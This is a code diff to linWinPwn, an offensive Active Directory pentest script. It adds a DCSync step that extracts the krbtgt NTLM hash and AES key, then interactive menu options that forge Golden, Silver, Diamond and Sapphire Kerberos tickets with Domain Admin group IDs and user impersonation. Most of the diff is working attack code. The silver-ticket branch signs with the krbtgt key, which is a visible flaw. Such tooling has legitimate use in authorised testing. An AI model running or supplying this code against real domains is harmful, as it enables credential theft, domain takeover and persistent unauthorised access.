@@ -58,6 +58,8 @@ impacket_reg=$(which reg.py)
 if [ ! -f "${impacket_reg}" ]; then impacket_reg=$(which impacket_reg); fi
 impacket_smbserver=$(which smbserver.py)
 if [ ! -f "${impacket_smbserver}" ]; then impacket_smbserver=$(which impacket-smbserver); fi
+impacket_ticketer=$(which ticketer.py)
+if [ ! -f "${impacket_ticketer}" ]; then impacket_ticketer=$(which impacket_ticketer); fi
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
@@ -91,7 +93,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.8.7 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.8.8 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -306,7 +308,7 @@ authenticate (){
         argument_manspider="-d ${domain} -u '' -p ''"
         argument_coercer="-d ${domain} -u '' -p ''"
         argument_bloodyad="-d ${domain} -u '' -p ''"
-        auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
+        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
     
     #Check if username is not provided
     elif [ "${user}" == "" ]; then
@@ -341,7 +343,7 @@ authenticate (){
         hash_bool=false
         kerb_bool=false
         aeskey_bool=false
-        auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
+        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}${user} with empty password ${NC}"
     
     fi
 
@@ -349,6 +351,7 @@ authenticate (){
         argument_ne="-d ${domain} -u ${user} -p ${password}"
         argument_imp="${domain}/${user}:${password}"
         argument_imp_gp="${domain}/${user}:${password}"
+        argument_imp_ti="-user ${user} -password ${password} -domain ${domain}"
         argument_bhd="-u ${user}@${domain} -p ${password} --auth-method ntlm"
         argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
         argument_adidns="-u ${domain}\\${user} -p ${password}"
@@ -371,7 +374,7 @@ authenticate (){
         hash_bool=false
         kerb_bool=false
         aeskey_bool=false
-        auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
+        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
     #Check if NTLM hash is used, and complete with empty LM hash
@@ -383,6 +386,7 @@ authenticate (){
             argument_ne="-d ${domain} -u ${user} -H ${hash}"
             argument_imp=" -hashes ${hash} ${domain}/${user}"
             argument_imp_gp=" -hashes ${hash} ${domain}/${user}"
+            argument_imp_ti="-user ${user} -hashes ${hash} -domain ${domain}"
             argument_bhd="-u ${user}@${domain} --hashes ${hash} --auth-method ntlm"
             argument_enum4linux="-w ${domain} -u ${user} -H $(expr substr $hash 34 65)"
             argument_adidns="-u ${domain}\\${user} -p ${hash}"
@@ -404,7 +408,7 @@ authenticate (){
             pass_bool=false
             kerb_bool=false
             aeskey_bool=false
-            auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
+            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
@@ -435,7 +439,7 @@ authenticate (){
             argument_donpapi="-k -no-pass ${domain}/${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
             argument_bloodyad="-d ${domain} -u ${user} -k"
-            auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $krb5cc)"
+            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Kerberos Ticket of $user located at $(realpath $krb5cc)${NC}"
         else
             echo -e "${RED}[i]${NC} Error accessing provided Kerberos ticket $(realpath $krb5cc)..."
             exit 1
@@ -461,7 +465,7 @@ authenticate (){
         hash_bool=false
         kerb_bool=false
         forcekerb_bool=false
-        auth_string="${YELLOW}[i]${NC} Authentication method: AES Kerberos key of ${user}"
+        auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}AES Kerberos key of ${user}${NC}"
     fi
 
     if [ "${nullsess_bool}" == false ] ; then
@@ -481,6 +485,7 @@ authenticate (){
         ne_verbose="--verbose"
         argument_imp="-debug ${argument_imp}"
         argument_imp_gp="-debug ${argument_imp_gp}"
+        argument_imp_ti="-debug ${argument_imp_ti}"
         argument_enum4linux="${argument_enum4linux} -v"
         argument_bhd="${argument_bhd} -v"
         argument_adidns="${argument_adidns} -v -d"
@@ -498,7 +503,6 @@ authenticate (){
         argument_bloodyad="-v DEBUG ${argument_bloodyad}"
     fi
     
-    echo ""
     echo -e ${auth_string}
 }
 
@@ -2047,6 +2051,24 @@ certsync_ntds_dump () {
     echo -e ""
 }
 
+get_hash_krbtgt (){
+    if [ ! -f "${impacket_secretsdump}" ] ; then
+        echo -e "${RED}[-] secretsdump.py not found! Please verify the installation of impacket${NC}"
+    else
+        if [ ! -f "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" ]; then
+            echo -e "${BLUE}[*] Extracting NTLM hash and AES keys of krbtgt${NC}"
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${PURPLE}[-] DCSync requires credentials${NC}"
+            else
+                run_command "${impacket_secretsdump} ${argument_imp}@${target} -just-dc-user $(echo ${domain} | cut -d "." -f 1)/krbtgt" | tee ${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt
+            fi
+        fi
+        krbtgt_nt=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep krbtgt |grep -v "aes\|des" | cut -d ":" -f 4)
+        krbtgt_aes=$(/bin/cat "${output_dir}/Credentials/hash_krbtgt_${dc_domain}.txt" | grep aes256 | cut -d ":" -f 3)
+    fi
+    echo -e ""
+}
+
 ad_enum () {
     bhd_enum
     ldapdomaindump_enum
@@ -2110,17 +2132,17 @@ vuln_checks () {
 }
 
 print_info () {
-    echo -e "${YELLOW}[i]${NC} Target domain: ${dc_domain}"
-    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${dc_FQDN}"
-    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${dc_ip}"
+    echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
+    echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
+    echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's ports: RPC ${dc_port_135}, SMB ${dc_port_445}, LDAP ${dc_port_389}, LDAPS ${dc_port_636}"
-    echo -e "${YELLOW}[i]${NC} Running modules: ${modules}"
-    echo -e "${YELLOW}[i]${NC} Output folder: ${output_dir}"
-    echo -e "${YELLOW}[i]${NC} User wordlist file: ${user_wordlist}"
-    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${pass_wordlist}"
-    echo -e "${YELLOW}[i]${NC} Attacker's IP: ${attacker_IP}"
-    echo -e "${YELLOW}[i]${NC} Attacker's Interface: ${attacker_interface}"
-    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "${YELLOW}[i]${NC} Running modules: ${YELLOW}${modules}${NC}"
+    echo -e "${YELLOW}[i]${NC} Output folder: ${YELLOW}${output_dir}${NC}"
+    echo -e "${YELLOW}[i]${NC} User wordlist file: ${YELLOW}${user_wordlist}${NC}"
+    echo -e "${YELLOW}[i]${NC} Password wordlist file: ${YELLOW}${pass_wordlist}${NC}"
+    echo -e "${YELLOW}[i]${NC} Attacker's IP: ${YELLOW}${attacker_IP}${NC}"
+    echo -e "${YELLOW}[i]${NC} Attacker's Interface: ${YELLOW}${attacker_interface}${NC}"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW}${curr_targets} ${custom_servers}${custom_ip}${NC}"
 }
 
 modify_target () {
@@ -2777,14 +2799,16 @@ auth_menu () {
     echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------"
     echo -e "ENTER) Go back to Init Menu"
-    echo -e "1) Generate and use NTLM hash of current user (requires: password)"
-    echo -e "2) Crack and use NTLM hash of current user (requires: NTLM hash)"
-    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key)"
+    echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
+    echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
+    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
     echo -e "4) Force use Kerberos authentication with netexec (requires: password, NTLM hash or AES key)"
     echo -e "5) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
     echo -e "6) Request certificate using Certipy (requires: authenticated)"
-    echo -e "7) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin) - TODO"
-    echo -e "8) Generate Silver Ticket (requires: password or NTLM hash of Service Account) - TODO"
+    echo -e "7) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "8) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "9) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
+    echo -e "10) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
 
     read -p "> " option_selected </dev/tty
 
@@ -2864,8 +2888,8 @@ auth_menu () {
         ;;
 
         4)
-        forcekerb_bool=true
         if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+            forcekerb_bool=true
             echo -e "${YELLOW}[i] Using kerberos authentication with netexec...${NC}"
         else
             echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
@@ -2933,10 +2957,170 @@ auth_menu () {
         ;;
         
         7)
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                echo -e "Please specify '1' for NTLM and '2' for AES:"
+                read -p ">> " ntlm_or_aes </dev/tty
+                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
+                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
+                    read -p ">> " ntlm_or_aes </dev/tty
+                done
+                get_hash_krbtgt
+                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi
+
+                tick_randuser="sql_svc"
+                tick_user_id=""
+                tick_groups=""
+                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -p ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "Please specify custom user id (press Enter to skip):"
+                read -p ">> " tick_user_id_value </dev/tty
+                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="-user-id ${tick_user_id_value}"; fi
+                echo -e "Please specify comma separated custom groups ids (e.g. '512,513,518,519,520') (press Enter to skip):"
+                read -p ">> " tick_group_ids_value </dev/tty
+                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="-groups ${tick_group_ids_value}"; fi
+
+                echo -e "${CYAN}[*] Generating golden ticket...${NC}"
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_golden.ccache" 2>/dev/null
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_golden.ccache" ]; then
+                    echo -e "${GREEN}[+] Golden ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_golden.ccache"
+                else
+                    echo -e "${RED}[-] Failed to generate golden ticket${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+            fi
+        fi
+        auth_menu
+        ;;
+
+        8)
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                echo -e "Please specify '1' for NTLM and '2' for AES:"
+                read -p ">> " ntlm_or_aes </dev/tty
+                while [[ "${ntlm_or_aes}" -ne 1 ]] && [[ "${ntlm_or_aes}" -ne 2 ]]; do
+                    echo -e "${RED}Wrong input${NC} Please specify '1' for NTLM and '2' for AES:"
+                    read -p ">> " ntlm_or_aes </dev/tty
+                done
+                get_hash_krbtgt
+                if [[ ${ntlm_or_aes} -eq 1 ]]; then krbtgt_key="-nthash ${krbtgt_nt}"; else krbtgt_key="-aesKey ${krbtgt_aes}"; fi
+
+                tick_randuser="sql_svc"
+                tick_spn="CIFS/${dc_domain}"
+                tick_groups=""
+                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -p ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "Please specify spn (press Enter to choose default value CIFS/${dc_domain}):"
+                read -p ">> " tick_spn_value </dev/tty
+                if [[ ! ${tick_spn_value} == "" ]]; then tick_spn="${tick_spn_value}"; fi
+
+                echo -e "${CYAN}[*] Generating silver ticket for service $spn...${NC}"
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                run_command "${impacket_ticketer} ${krbtgt_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuser}"
+                ticket_out="${tick_randuser}_silver_$(echo ${tick_spn} | sed 's/\//_/g').ccache"
+                /bin/mv "./${tick_randuser}.ccache" "./${ticket_out}" 2>/dev/null
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${ticket_out}" ]; then
+                    echo -e "${GREEN}[+] silver ticket generated successfully:${NC} ${output_dir}/Credentials/${ticket_out}"
+                else
+                    echo -e "${RED}[-] Failed to generate silver ticket${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+            fi
+        fi
         auth_menu
         ;;
         
-        8)
+        9)
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                get_hash_krbtgt
+                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
+                tick_randuser="sql_svc"
+                tick_user_id="1337"
+                tick_groups="512,513,518,519,520"
+                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -p ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                read -p ">> " tick_user_id_value </dev/tty
+                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                read -p ">> " tick_group_ids_value </dev/tty
+                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+
+                echo -e "${CYAN}[*] Generating diamond ticket...${NC}"
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_diamond.ccache" 2>/dev/null
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_diamond.ccache" ]; then
+                    echo -e "${GREEN}[+] Diamond ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_diamond.ccache"
+                else
+                    echo -e "${RED}[-] Failed to generate diamond ticket${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+            fi
+        fi
+        auth_menu
+        ;;
+        
+        10)
+        if [ ! -f "${impacket_ticketer}" ]; then
+            echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ]; then
+                get_hash_krbtgt
+                krbtgt_key="-nthash ${krbtgt_nt} -aesKey ${krbtgt_aes}"
+                tick_randuser="sql_svc"
+                tick_user_id="1337"
+                tick_groups="512,513,518,519,520"
+                tick_domain_admin="${user}"
+                echo -e "Please specify random user name (press Enter to choose default value 'sql_svc'):"
+                read -p ">> " tick_randuser_value </dev/tty
+                if [[ ! ${tick_randuser_value} == "" ]]; then tick_randuser="${tick_randuser_value}"; fi
+                echo -e "Please specify custom user id (press Enter to choose default value '1337'):"
+                read -p ">> " tick_user_id_value </dev/tty
+                if [[ ! ${tick_user_id_value} == "" ]]; then tick_user_id="${tick_user_id_value}"; fi
+                echo -e "Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):"
+                read -p ">> " tick_group_ids_value </dev/tty
+                if [[ ! ${tick_group_ids_value} == "" ]]; then tick_groups="${tick_group_ids_value}"; fi
+                echo -e "Please specify domain admin to impersonate (press Enter to choose default value current user):"
+                read -p ">> " tick_domain_admin_value </dev/tty
+                if [[ ! ${tick_domain_admin_value} == "" ]]; then tick_domain_admin="${tick_domain_admin_value}"; fi
+
+                echo -e "${CYAN}[*] Generating sapphire ticket...${NC}"
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                run_command "${impacket_ticketer} ${argument_imp_ti} -request -domain-sid ${sid_domain} -impersonate ${tick_domain_admin} ${krbtgt_key} -user-id ${tick_user_id} -groups ${tick_groups} ${tick_randuser}"
+                /bin/mv "./${tick_randuser}.ccache" "./${tick_randuser}_sapphire.ccache" 2>/dev/null
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${tick_randuser}_sapphire.ccache" ]; then
+                    echo -e "${GREEN}[+] Sapphire ticket generated successfully:${NC} ${output_dir}/Credentials/${tick_randuser}_sapphire.ccache"
+                else
+                    echo -e "${RED}[-] Failed to generate sapphire ticket${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
+            fi
+        fi
         auth_menu
         ;;
 
@@ -2946,7 +3130,7 @@ auth_menu () {
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        init_menu
+        auth_menu
         ;;
     esac
 }
@@ -2981,6 +3165,7 @@ config_menu () {
         if [ ! -f "${impacket_goldenPac}" ] ; then echo -e "${RED}[-] impacket's goldenPac is not installed${NC}"; else echo -e "${GREEN}[+] impacket's goldenPac is installed${NC}"; fi
         if [ ! -f "${impacket_rpcdump}" ] ; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
         if [ ! -f "${impacket_reg}" ] ; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
+        if [ ! -f "${impacket_ticketer}" ] ; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
         if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
         if [ ! -f "${netexec}" ] ; then echo -e "${RED}[-] netexec is not installed${NC}"; else echo -e "${GREEN}[+] netexec is installed${NC}"; fi
@@ -3182,6 +3367,9 @@ main () {
     prepare
     print_info
     authenticate
+    run_command "${netexec} ldap ${target} ${argument_ne} --get-sid --log ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt" > /dev/null
+    sid_domain=$(/bin/cat ${output_dir}/DomainRecon/ne_sid_output_${dc_domain}.txt 2>/dev/null | grep "Domain SID" | head -n 1 | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12)
+    echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
     echo -e ""
     if [[ "$modules" == *"interactive"* ]]; then
         modules="interactive"
